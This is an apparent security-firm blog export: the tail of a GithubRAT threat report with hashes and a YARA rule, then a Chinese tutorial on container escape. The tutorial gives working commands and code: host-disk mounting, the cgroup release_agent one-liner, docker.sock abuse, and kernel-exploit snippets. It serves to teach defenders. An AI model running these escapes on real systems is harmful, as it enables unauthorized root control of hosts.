Dump）、漏洞利用（Exploit）及後門（Backdoor）等惡意程式，其詳細清單如下表所示。\n\n|Hash|說明|\n|---|---|\n|a5f12ee032af8e8dd5a373f611f64726|Backdoor Loader|\n|944465a0edd09d8eb569630a68ee111c|Cobalt Strike Payload|\n|e5ed0de0100f670324202bbf5982a80a|Cobalt Strike  Payload|\n|4f67e80118dcc4a42ebcb2af2cad65ce|Hacktool，CVE-2014-4113 Exploit|\n|0468a816c167ca5ad301dc408eb19fb5|HackTool，Chrome Password Dump|\n|b33c7c022e1a25a981faabfc0fe53f6d|HackTool，AD Password Brute-Force Tool|\n|5178eb048ecaed83b69aa277a7c6d784|HackTool，NETBIOS NameServer Scanner|\n|2f9b582378c559ca66b48abd51f436a0|HackTool，TCP Port Banner Scanner|\n|aad8b062891c0715a1842270c0a871eb|HackTool，MS-17-010 Eternalblue Scanner|\n|41e32076f2e75181ce9f1cac6099a918|HackTool，MS-17-010 Eternalblue Scanner|\n|1a41f9550964ada62f87f6a0b79e37ba|HackTool，NETBIOS NameServer Scanner|\n_表一、駭客 GitHub 專案中的惡意程式列表_\n\n## 影響與建議\n由於許多單位都會使用 Github 服務作為版本控制之用，因此對 Github 的存取都會是許可的狀態，這也變成駭客反過來利用的機制。駭客利用大眾對於雲端服務的需求，轉而透過該雲端服務作為中繼站，遠端控制受害電腦。同時，該 GithubRAT 係透過 PyInstaller 進行封裝，駭客使用其他封裝工具即可快速改變檔案雜湊值，因此 TeamT5 建議可透過網路連線紀錄來威脅狩獵（Threat Hunting），找尋環境內是否有密集且定期的 api.github.com 連線紀錄，藉此找出環境中異常的網路存取連線。\n\n最後，若單位遭遇進階持續性威脅（Advanced Persistent Threat, APT）時，建議可使用 TeamT5 的 ThreatSonar 惡意威脅鑑識分析平臺，可有效偵測此類進階攻擊手法，並快速完成事件關聯與回應。TeamT5 建議可將下方威脅指標（Indicator of Compromise, IOC）匯入各式資安設備中，強化威脅偵測與識別。\n\n* 表一中所有的惡意程式雜湊值\n* Yara Rule\n\n```\nrule RAT_Github\n{\n    meta:\n        description= \"detecting GithubRAT memory\"\n        author = \"TeamT5\"\n        date = \"2020-08-05\"\n    \n    strings:\n        $str1 = \"pyi-windows-manifest-filename\"\n        $str2 = \"https://api.github.com/repos/{}/{}/contents/{}/{}\"\n        $str3 = \"back_cmd\"\n        $str4 = \"put_git_answer\"       \n    \n        all of them\n}\n```\n\n![202008-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-3_222c942e82.png)\n_圖三、ThreatSonar 供資安人員快速匯入 Yara Rule 並自訂威脅等級_","title":"Github 不再只是版控平台，還是 APT 後門中繼站","createdAt":"2020-08-09T15:59:08.518Z","updatedAt":"2020-12-14T08:22:51.190Z","__v":0,"id":"5f301d4c163518003f86da79"}],"createdAt":"2020-08-09T15:59:08.292Z","updatedAt":"2021-01-27T04:40:39.819Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1597026081/brina-blum-Bb_X4JgSqIM-unsplash_8163042d8a.jpg","id":"5f301d4c163518003f86da78"},{"publish":true,"enable_form":false,"tags":["5ed467d0165e5f006fa403fd","5ed467b5165e5f006fa403fc","5f573a18531f77004b1a3202","5f573a20531f77004b1a3203","5ecf6d2cfedd7f004b269751"],"relative_posts":[],"_id":"5f573974531f77004b1a31fe","post_url":"container-escape-101","post_name":"Container Escape 101","publish_date":"2020-09-16T03:00:00.000Z","contents":[{"locale":"tw","_id":"5f573974531f77004b1a31ff","title":"Container Escape 101","context":"圖片來源：[Pixabay](https://pixabay.com/photos/emergency-exit-exit-sign-escape-1321134/)\n\n## 前言\n\n本月來到 D39 與大家分享近期有趣的研究，Lab 團隊雖然不像是科幻電影中的實驗室般，穿著帥氣的白袍與擁有高科技的實驗室，但我們主要專注於最新技術與威脅研究，與惡意程式作者們互相切磋是我們的日常。而 Lab 中的 D39 成員更致力於弱點安全與漏洞挖掘領域，研究範圍包含 Mobile、IOT、Linux、Windows 等有機會連網的系統與裝置都是我們的目標，期許能提升客戶產品安全性，打造優良的上網環境（笑）\n\n這一次由 D39 實習生 Jack，為我們精心整理 Container 相關的弱點攻擊方式，透過清楚易懂的介紹，帶大家了解究竟在駭客眼中的 Container，存在哪些資安問題呢？\n\n## 正文開始\n\n相信大家對 Docker 都不陌生，無論是想要架設網站、資料庫或郵件伺服器，只要一行 `docker run` 就能搞定，不用處理可怕的環境問題，但若它存在漏洞或一些錯誤的設定，跑在 Container 內的 Process 就有可能控制主機。\n\n這次與大家介紹 Container Escape 的一些攻擊方法，讓各位在使用 Container 時可以留意相關的安全隱憂，以及了解這些漏洞造成的影響。\n\n## Container\n\n在介紹攻擊方法之前，先來了解一下 Container 使用到的技術：\n\n* Namespaces\n* Cgroups\n* Seccomp\n* Capabilities\n* LSM\n* OverlayFS\n\n### Namespaces\n\nContainer 好用的地方在於，它能夠建立一個獨立的環境，可以放心地安裝一大堆想嘗試的套件，不怕弄髒自己的環境。要實現這個功能，Namespaces 扮演了一個很重要的角色。\n\n來看看 Linux Programmer's Manual [Man page](https://man7.org/linux/man-pages/man7/namespaces.7.html) 的描述：\n\n>A namespace wraps a global system resource in an abstraction that makes it appear to the processes within the namespace that they have their own isolated instance of the global resource.  Changes to the global resource are visible to other processes that are members of the namespace, but are invisible to other processes.  One use of namespaces is to implement containers.\n\n這邊的「資源」（resource）指的就像 Mount point 或 PID，Namespaces 可以建立一個獨立的 Mount point 或 PID，讓 Container 僅能存取自己掛載的檔案系統或自己的 Process，與 Host 隔離開來，不會弄亂 Host 的檔案，或存取到 Host 的 Process 資訊。\n\n使用 Namespaces 的方式就是呼叫 `unshare`、`setns`、`clone` 等 System call，類別也不只有 Mount 與 PID，詳細可以看 [Man page](https://man7.org/linux/man-pages/man7/namespaces.7.html)。\n\n### Cgroups\n\nCgroups 透過 `cgroupfs` 控制 Process 所能使用的記憶體容量或 CPU 資源，讓 Process 不會因為一些 bug 讓整台電腦當機，Docker 可以用 `--cpu-shares` 來限制各個 Container 能用到的 CPU 資源。詳細請見 [Cgroups man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)。\n\n### Seccomp\nSeccomp (Secure Computing) 對 CTFer 可能不陌生，用來限制能夠使用的 System call，常見於一些 Shellcode 題。\n\nContainer 很常禁用 `mount` ，因為它是一個方便我們逃離 Container 的 System call，接下來就會說明如何利用 `mount` 逃出 Container。詳細請見 [Seccomp man page](https://man7.org/linux/man-pages/man2/seccomp.2.html)。\n\n### Capabilities\n\nCapabilities 從 Linux Kernel 2.2 開始加入，目的是將權限做更細緻的區隔，以 Container 來說，若直接給它 `root` 權限是不安全的，這意味著它可以隨意載入 Kernel module 或 `mount`，讓 Container 有機會存取 Host 資源，因此 Container 內的 `root` 只有一些基本的 Capabilities，如 CAP\\_CHOWN、CAP\\_KILL、CAP\\_SETUID、CAP\\_SETGID 等。Ubuntu 使用者可以安裝 `libcap2-bin` 並使用 `getpcaps {pid}` 查看該 Process 擁有哪些 Capabilities，詳細請看 [man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)。\n\n### LSM (Linux Security Module)\n\nLinux kernel 文件裡寫道：\n\n> The primary users of the LSM interface are Mandatory Access Control (MAC) extensions which provide a comprehensive security policy.\n\n如 AppArmor 和 SELinux 都是 Linux Kernel 內建的 Security Module，透過它們專屬的設定檔可以限制 Process 的存取權限，像 Docker 就是使用 AppArmor 限制 `procfs` 以及 `mount`，保護 Host 資源。\n\n### OverlayFS\n\n許多 Container 使用 OverlayFS 當作它的檔案系統，如它的名字，目的就是要把兩個或多個檔案系統合併，讓它看起來是一個檔案系統。它使用了 `upper` 與 `lower` 區分兩種要合併的檔案系統，其中若 `upper` 與 `lower` 有相同檔案時，會以 `upper` 為主。我們用 Container 來解釋，Docker 把 `upper` 當作 Container layer、`lower` 當作 Image layer，我們在 `docker build` 的時候會產生 Image，利用這些 Image 我們可以很快地產出 Container，在 Image 內的檔案如 Ubuntu 預設的系統檔案就會被放在 Image layer，在 Container runtime 產生的檔案，例如 Log 檔會被放在 Container layer，這麼一來建立多個 Container 時可以讓它們的 Image layer 都是同一個，省下許多空間。\n\n來實驗一下，首先開兩個 Container：\n\n```\n$ docker run --name t1 -it ubuntu\nroot@e937832abc06:/#\n```\n\n```\n$ docker run --name t2 -it ubuntu\nroot@71c8a58e90ac:/#\n```\n\n檢查它們的 LowerDir：\n\n```\n$ docker inspect t1 | grep Lower\n                \"LowerDir\": ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,\n$ docker inspect t2 | grep Lower\n                \"LowerDir\": ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,\n```\n\n仔細一看，列出來的路徑幾乎是一樣的，接下來看看裡面有什麼：\n\n```\n$ sudo ls -alF /var/lib/docker/overlay2/07a2cbd7...dbdf/diff\ntotal 24\ndrwxr-xr-x 6 root root 4096 Nov 13  2019 ./\ndrwx------ 4 root root 4096 Nov 13  2019 ../\ndrwxr-xr-x 4 root root 4096 Nov  1  2019 etc/\ndrwxr-xr-x 2 root root 4096 Nov  1  2019 sbin/\ndrwxr-xr-x 3 root root 4096 Oct 30  2019 usr/\ndrwxr-xr-x 3 root root 4096 Oct 30  2019 var/\n```\n\n是很常見的系統資料夾！也就是 Image layer，接下來看 Container layer：\n\n```\nroot@e937832abc06:/# echo 'hello, host' > /hello\n```\n\n先在 Container 內創立一個檔案：\n\n```\n$ docker inspect e937 | grep Upper\n                \"UpperDir\": \"/var/lib/docker/overlay2/657597a...a966/diff\",\n$ sudo cat /var/lib/docker/overlay2/657597a...a966/diff/hello\nhello, host\n```\n\n然後用 `docker inspect` 找到 UpperDir，就會看到我們建立的 `hello` 檔案了！\n\n<br/>\n\n## Container Escape\n來試想一個情境，有一台主機遵守 Microservices 的精神，使用 Docker 分別架設了網站、資料庫與郵件伺服器這三個 Container，假設郵件伺服器存在漏洞被駭客入侵，也不會直接影響到網站和資料庫，維護的工程師也能很快的用 Docker 換成新版本來進行即時修補。但如果 Container 存在漏洞時，所有的服務都有可能陷入風險。\n\n### Privileged Container\n我們先從比較容易 Escape 的 Privileged Container 開始，Privileged Container 沒有 Seccomp 限制且 Capability 全開，讓 Container 可以存取所有硬體設備，為的就是讓這個 Container 有獨立的環境且能做 Host 能做的事。Docker 建立 Privileged container 的方法很簡單，只要在 `dokcer run` 時多加個 `--privileged` flag 即可。\n\n`docker run --privileged -it ubuntu`\n\n另外還有一個很棒的功能，用 Docker 跑 Docker。聽起來很奇怪但很合理，如果去看 Docker 的[開發文件](https://github.com/docker/docker-ce/blob/master/components/engine/docs/contributing/set-up-dev-env.md)，會發現 Docker 是用 Docker 開發的。\n\n一般來說開發用的 Privileged container 駭客碰不到，但如果是用 Docker 架設 CI/CD 工具，然後使用這些工具的 Docker 功能呢？歡迎參考[這篇](https://www.slideshare.net/Docker/build-publish-deploy-and-test-docker-images-and-containers-with-jenkins-workflow)的 \"How Can You Use Jenkins & Docker Together\"。\n\n沒錯，你需要一個 Privileged container 來運行 CI/CD 工具！接下來先以 Privileged container 為例，說明在我們打下有漏洞的 CI/CD 工具且有 `root` 權限後，要怎麼控制 Host。\n\n#### Mount root\n第一個要介紹的是這個一直被針對的 `mount` ，在 Privileged container 裡是可以直接使用的，來看看如何透過它存取 Host 檔案。\n\n首先先取得 Block device 的 Major 與 Minor：\n\n```\nroot@997453a4062f:/test# ls -alF /sys/dev/block/ | grep sda1\nlrwxrwxrwx 1 root root 0 Aug 12 06:50 8:1 -> ../../devices/pci0000:00/0000:00:01.1/ata1/host0/target0:0:0/0:0:0:0/block/sda/sda1/\n```\n\n`sda1` 是 Host 的根目錄（不同的電腦可能不一樣，對駭客來說可以全部都試試看）。接下來用 `mknod` 產 Block special file 然後 `mount`，就會把 Host 的根目錄放在 Container 內了（若 `/dev/sda1` 不存在才需要使用 `mknod`）。\n\nDocker:\n\n```\nroot@997453a4062f:/test# mknod /dev/myroot b 8 1\nroot@997453a4062f:/test# mkdir rootfs; mount /dev/myroot rootfs\nroot@997453a4062f:/test# echo hello, host! > rootfs/hello\n```\n\nHost:\n\n```\nroot@escape:/# cat /hello\nhello, host!\n```\n\n#### Cgroups v1 release notification\n\n只能存取 `root` 資料夾還不夠！我們的目標是能在 Host 上做任何事且不受 Container 影響。接下來要介紹的是 [Felix Wilhelm 在 Twitter 上寫的](https://twitter.com/_fel1x/status/1151487051986087936)：\n\n> Quick and dirty way to get out of a privileged k8s pod or docker container by using cgroups release_agent feature.\n\n```\nd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nmkdir -p $d/w;echo 1 >$d/w/notify_on_release\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\ntouch /o; echo $t/c >$d/release_agent;echo \"#!/bin/sh\n$1 >$t/o\" >/c;chmod +x /c;sh -c \"echo 0 >$d/w/cgroup.procs\";sleep 1;cat /o\n```\n\n直接用 Docker 跑跑看：\n\n```\n$ docker run --privileged -it ubuntu\nroot@acf8f56c9de6:/test# cat > exp.sh\nd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nmkdir -p $d/w;echo 1 >$d/w/notify_on_release\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\ntouch /o; echo $t/c >$d/release_agent;echo \"#!/bin/sh\n$1 >$t/o\" >/c;chmod +x /c;sh -c \"echo 0 >$d/w/cgroup.procs\";sleep 1;cat /o\nroot@acf8f56c9de6:/test# chmod +x ./exp.sh\nroot@acf8f56c9de6:/test# ./exp.sh ps\n  PID TTY          TIME CMD\n    1 ?        00:01:31 systemd\n    2 ?        00:00:00 kthreadd\n    3 ?        00:00:00 rcu_gp\n    4 ?        00:00:00 rcu_par_gp\n    6 ?        00:00:00 kworker/0:0H-kb\n    9 ?        00:00:00 mm_percpu_wq\n   10 ?        00:00:15 ksoftirqd/0\n   11 ?        00:09:23 rcu_sched\n   12 ?        00:00:02 migration/0\n   13 ?        00:00:00 idle_inject/0\n   14 ?        00:00:00 cpuhp/0\n   15 ?        00:00:00 cpuhp/1\n   16 ?        00:00:00 idle_inject/1\n   17 ?        00:00:03 migration/1\n   18 ?        00:00:05 ksoftirqd/1\n   20 ?        00:00:00 kworker/1:0H-ev\n   ...\nroot@acf8f56c9de6:/test# ./exp.sh id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n太棒了！可以在 Container 外執行任意指令且是 `root` 權限。接下來分析它怎麼做到的：\n\n```\nroot@acf8f56c9de6:/test# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nroot@acf8f56c9de6:/test# echo $d\n/sys/fs/cgroup/rdma\n```\n\n`d` 變數的目的是取得 Cgroups 底下有 `release_agent` 檔案的路徑，`release_agent` 的描述可參考 [Man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)：\n\n> A special file in the root directory of each cgroup hierarchy, release_agent, can be used to register the pathname of a program that may be invoked when a cgroup in the hierarchy becomes empty.\n\n變為空的意思：\n\n> A cgroup is considered to be empty when it contains no child cgroups and no member processes.\n\n`release_agent` 一般用來讓使用者自訂腳本，清理新建的 Cgroups 讓 `cgroupfs` 保持乾淨，而它會在 Host 以 `root` 權限執行，所以只要能控制 `release_agent`，我們就可以在 Container 外執行任意指令。\n\n在 Cgroups 資料夾底下創立一個 `w` 資料夾，會讓 Cgroups 創立一個新的群組，然後啟用這個群組的 `notify_on_release`：\n\n```\nmkdir -p $d/w;echo 1 >$d/w/notify_on_release\n```\n\n`t` 變數是找出 Host 可以直接看到 Container 檔案的路徑，也就是 OverlayFS 的 UpperDir (Container layer) ，以便 `release_agent` 能夠呼叫 Container 內的惡意腳本：\n\n```\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\n```\n\n最後一步把 `release_agent` 指到我們能控制的惡意腳本，然後利用 `echo 0 > $d/w/cgroup.procs` 把 `echo` 加入 `w` 這個 Cgroups，待 `echo` 結束後就會觸發 `notify_on_release` 然後呼叫 `release_agent`：\n\n```\ntouch /o; echo $t/c >$d/release_agent;echo \"#!/bin/sh\n$1 >$t/o\" >/c;chmod +x /c;sh -c \"echo 0 >$d/w/cgroup.procs\";sleep 1;cat /o\n```\n\n可以發現我們主要用到的功能是 Cgroups 以及 `mount`，因此這個利用方式有個修訂版本，只要使用 `docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash` 就可以利用較少的權限 Escape，詳細可以看[這篇文章](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)。\n\n<iframe src=\"https://asciinema.org/a/356357/embed?\" id=\"asciicast-iframe-356357\" name=\"asciicast-iframe-356357\" scrolling=\"no\" allowfullscreen=\"true\" style=\"overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;\"></iframe>\n\n#### Exposed docker.sock\n\n用 Docker 跑 Docker 的方式還有這個：\n\n```\ndocker run -v /var/run/docker.sock:/var/run/docker.sock\n```\n\n`dockerd` 開啟後預設會在 `/var/run/docker.sock` 聽取命令，等待使用者送出 Docker 指令後，`docker-cli` 會把指令轉成一定的格式跟 `docker.sock` 溝通，所以把這個檔案映射到 Container 內，等同於讓這個 Container 能夠用 Host 的名義建立 Container。\n\n我們可以簡單的使用 `curl` 控制 `docker.sock`：\n\n```\n$ curl -XPOST --unix-socket /var/run/docker.sock -d '{\"Image\":\"ubuntu\", \"Privileged\":true}' -H 'Content-Type: application/json' http://localhost/containers/create\n{\"Id\":\"8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a\",\"Warnings\":[]}\n$ curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a/start\n```\n\n只要對 `docker.sock` 發送請求就能創立一個 Container！可以用上面的方法開啟一個 Privileged container，再利用前面的手法拿到 Host 控制權！\n\n<br/>\n\n### Container Engine bug\n\n不過一般的服務如郵件伺服器，它不需要用 Docker 跑 Docker 的功能，也就不會以 `--privileged` 的方式運行，所以就算利用漏洞拿到 Container 的 `root` 權限，也不能用 `mount` 或 `docker.sock` 的方式 Escape，但如果 Container Engine 本身有漏洞，就有機會利用它控制 Host。\n\n#### runC CVE-2019-5736\n\n第一個要介紹的是 runC (run container)，它是一個根據 OCI 規範用來運行 Container 的程式，被許多 Container engine 呼叫，例如：Docker、Kubernets、LXC 等，因此這個漏洞影響範圍相當大（[詳細受影響清單](https://www.cvedetails.com/cve/CVE-2019-5736/)）。而攻擊條件是駭客在 Container 內有 `root` 權限，或 Container Engine 執行了惡意的 Container。\n\n它的漏洞原因在於，新的 Process 若是 `/proc/self/exe`，就能利用殘留的 File descriptor 改寫 runC 這隻程式，等到下次有人使用 Docker 時就會執行被改寫的 runC，而 Docker 是用 `root` 權限運行的，因此就獲得了 `root` 的任意命令執行！\n\n先來看 Process 在正常狀況下是如何被放進 Container。在執行 `docker exec` 的時候 runC 會把自己放進 Container 的 Namespace 然後再 `execve(\"binary\")`：\n\n![Blog_9-6](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-6_2c8cdf52db.png)\n\n但 Process 若指定成 `/proc/self/exe` 就會指回 runC 本身：\n\n![Blog_9-7](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544713/Blog_9-7_011278ad04.png)\n\n有趣的事情發生了！runC 執行 `execve(\"/proc/self/exe\")`，也就是再跑了一次 runC，但用的 Library 是 Container 內的 Library，所以我們可以改寫 Container 內的 `libc` 或 `libseccomp` 之類的 runC 會用到的 Dynamic library，執行任意的程式碼！\n\n![Blog_9-8](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-8_2620f0f070.png)\n\n有任意程式碼執行後重複開啟 `/proc/self/exe`，就能存取 Host 的 runC 程式，但在 Linux 裡執行中的程式是不能被修改的，所以先用 `open` 的 `O_PATH` 模式留下 File descriptor，但不開啟檔案然後 `fork` 讓子程序對 runC 寫入惡意指令，接下來只要等待下一次的 `docker exec` 就會觸發惡意指令！\n\n![Blog_9-9](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-9_fb31bbc0f3.png)\n\n這個漏洞是 CTF 隊伍 Dragon Sector 打完比賽後獲得靈感而研究出來的漏洞，詳細的挖掘過程在他們的[部落格](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)，以及他們的 [Exploit Code](https://www.openwall.com/lists/oss-security/2019/02/13/3)。\n\n<iframe src=\"https://asciinema.org/a/356360/embed?\" id=\"asciicast-iframe-356360\" name=\"asciicast-iframe-356360\" scrolling=\"no\" allowfullscreen=\"true\" style=\"overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;\"></iframe>\n\n<br/>\n\n#### rkt CVE-2019-10144/CVE-2019-10145/CVE-2019-10147\n\nrkt 也是一個 Container engine，但已經沒有在維護了，所以這三個 CVE 到現在還是可以利用，不過利用條件較為嚴苛，駭客需要控制由 `rkt enter` 開啟的 Process 才能 Escape（一般狀況下會以 `rkt run` 的方式開啟）。\n\n`rkt enter` 就像是 `docker exec`，可以在指定的 Container 內執行程式，但使用 `rkt enter` 執行的程式擁有所有的 Capabilities ，沒有 Seccomp 限制也沒有隔離 Cgroups。就像個 Privileged Container！\n\n所以使用 `getpcaps $$` 看到所有 Capabilities 的話，恭喜你，你處在一個可以 Container Escape 的環境內！\n\n來看看利用方法，首先下載最新版的 rkt：\n\n```\nwget https://github.com/rkt/rkt/releases/download/v1.30.0/rkt-v1.30.0.tar.gz\ntar xzvf rkt-v1.30.0.tar.gz\ncd rkt-v1.30.0\n./rkt help\n```\n\n用 `getpcaps` 檢查看看：\n\n```\n$ sudo ./rkt --insecure-options=image --interactive=true  run docker://libpcap/libpcap\nroot@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$\nCapabilities for `6': = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep\n```\n\n```\n$ sudo ./rkt enter 9354 /bin/bash\nroot@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$\nCapabilities for `14': = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_rｆaw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep\n```\n\n使用 `rkt enter` 開啟的 `bash` 有 `cap_sys_admin`，可以試著用之前說到的 `mount` 方法存取 Host 的檔案！\n\n但這裡會遇到一些問題，`mknod` 出來的 Block special file 放的位置會影響能不能 `mount`，所以這邊用一個改良的做法：\n\n```\n# mkdir mydev\n# mkdir rootfs\n# mount -t devtmpfs none mydev\n# mount mydev/sda1 rootfs\n```\n\n直接 `mount` 一個型態為 devtmpfs 的資料夾， Linux kernel 就會自動把所有的 Device file 準備好，我們只要 `mount mydev/sda1` 就能存取 Host 的根目錄！\n\n<br/>\n\n### Linux kernel exploit\n\n前面講到的 Privileged container 以及 Container Engine bug 需要在 Container 內有 `root` 權限，但並不是每個服務都是以 `root` 權限運行，例如 HTTP server 通常會以較低權限的使用者如 `www-data` 身份執行，聰明的你一定注意到了，利用 Linux kernel exploit 獲得 `root` 權限然後再 Escape！\n\n其實，有 Linux kernel exploit 的話可以直接 Escape！Container 用到的 Namespaces、Cgroups 等都是由 Linux kernel 提供的功能，所以如果在 Kernel space 內改寫相關結構，再跳回 User space，就能控制 Host，而且也不需要 Container 的漏洞！\n\n讓我們看看 Linux kernel 內管理 Process 的結構 [`task_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L818)\n\n```clike=\nstruct task_struct {\n\t/* ... */\n\t/*\n\t * Pointers to the (original) parent process, youngest child, younger sibling,\n\t * older sibling, respectively.  (p->father can be replaced with\n\t * p->real_parent->pid)\n\t */\n\t\n\t/* Real parent process: */\n\tstruct task_struct __rcu\t*real_parent;\n\t\n\t/* Recipient of SIGCHLD, wait4() reports: */\n\tstruct task_struct __rcu\t*parent;\n\t/* ... */\n\t/* Filesystem information: */\n\tstruct fs_struct\t\t*fs;\n\t/* ... */\n}\n```\n\n裡面有一個 [`fs_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/fs_struct.h#L9)，再往裡面看看：\n\n```clike=\nstruct fs_struct {\n\tint users;\n\tspinlock_t lock;\n\tseqcount_t seq;\n\tint umask;\n\tint in_exec;\n\tstruct path root, pwd;\n} __randomize_layout;\n```\n\n`task_struct->fs` 存放著這個 Process 的 `root` 以及工作目錄，而我們能夠用 `task_struct->real_parent` 取得 Parent process 的 `task_struct`，所以我們可以不斷的往上找，直到找到 `PID = 1`，也就是位於 Host 的 Init process，然後把它的 `fs_struct` 複製給自己，就可以存取 Host 的根目錄了！\n\n![Blog_9-12](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-12_97ea7b5407.png)\n\n這個 Exploit 取自 Nick Freeman 的文章  [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)，他修改了由 Andrey Konovalov 寫的 Linux Kernel exploit，讓它可以 Escape container：\n\n```clike=\ntypedef unsigned long __attribute__((regparm(3))) (*_copy_fs_struct)(unsigned long init_task);\n\nuint64_t get_task(void) {\n    uint64_t task;\n    asm volatile (\"movq %%gs: 0xD380, %0\":\"=r\"(task));\n    return task;\n}\n\nvoid get_root(void) {\n\n    int i;\n    char *task;\n    char *init;\n    uint32_t pid = 0;\n\n\n\t((_commit_creds)(COMMIT_CREDS))(\n\t    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));\n\n\n    task = (char *)get_task();\n    init = task;\n    while (pid != 1) {\n        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);\n        pid = *(uint32_t *)(init + TASK_PID_OFFSET);\n    }\n\n  \n    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));\n}\n```\n\n每個 Linux kernel exploit 都會有一行：\n\n```\n\t((_commit_creds)(COMMIT_CREDS))(\n\t    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));\n```\n\n用途是建立擁有所有權限的 Credentials 並使用它，也就是讓這個 Process 變成 `root` 權限。而這個 Exploit 就是在它之後加上：\n\n```clike\n    task = (char *)get_task();\n    init = task;\n    while (pid != 1) {\n        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);\n        pid = *(uint32_t *)(init + TASK_PID_OFFSET);\n    }\n\n  \n    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));\n```\n\n用 `while` 迴圈找到 Init process，然後呼叫 `copy_fs_struct` 把 `fs_struct` 複製回來，就能看到 Host 的根目錄。\n\n<iframe src=\"https://asciinema.org/a/356361/embed?\" id=\"asciicast-iframe-356361\" name=\"asciicast-iframe-356361\" scrolling=\"no\" allowfullscreen=\"true\" style=\"overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;\"></iframe>\n\n但還沒結束！我們實際上還沒繞過 Namespaces 的限制，如果使用 `kill` 是會失敗的：\n\n```\nubuntu@ubuntu:/$ ./poc\n[^] starting\n[=] running KASLR defeat exploit (CVE-2017-18344)\n[0] enumerating divide_error() location (CVE-2017-18344)\n[>] setting up proc reader\n...\n[+] done, should be root now\n[6] checking if we got root\n[+] got r00t ^_^\nroot@ubuntu:/# ps aux | grep cat\nuser     22522  0.0  0.0   7444   680 pts/1    S+   17:34   0:00 cat\nroot     22547  0.0  0.0  11288   924 pts/3    S+   17:35   0:00 grep --color=auto cat\nroot@ubuntu:/# kill 22522\nbash: kill: (22522) - No such process\n```\n\n但也足夠了，可以用 Docker 執行 Privileged container 再 Escape。或是 Nick Freeman 提供的作法：\n\n> * Write or overwrite host or other container files (including kubelet configs)\n> * Interact with Docker (perhaps pull and launch a new fun privileged container)\n> * Inject code or harvest data from processes (host or container) via /proc/pid/mem\n> * Load/ unload kernel modules\n\n<br/>\n\n這麼一來就可以不用花費力氣在換 Namespaces 上，但也有一篇文章提到更換 Namespaces 的方法 [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)：\n\n```clike=\nvoid get_root_payload( void) {\n\n        ((_commit_creds)(COMMIT_CREDS))(\n                ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0)\n        );\n\n        // -------- NAMESPACE DOCKER EXPLOIT  --------\n        // copy nsproxy from init_nsproxy to pid 1 of the container\n        unsigned long long g = ((_find_task_vpid)(FIND_TASK))(1);\n\n        // now, do the magic.... !!!! Simple black magic doesn't work on current process!!!!\n        ((_switch_task_namespaces)(SWITCH_TASK_NS))(( void *)g, (void *)INIT_NSPROXY);\n\n        // prepare the two namespace FDs by opening the respective files\n        long fd = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, 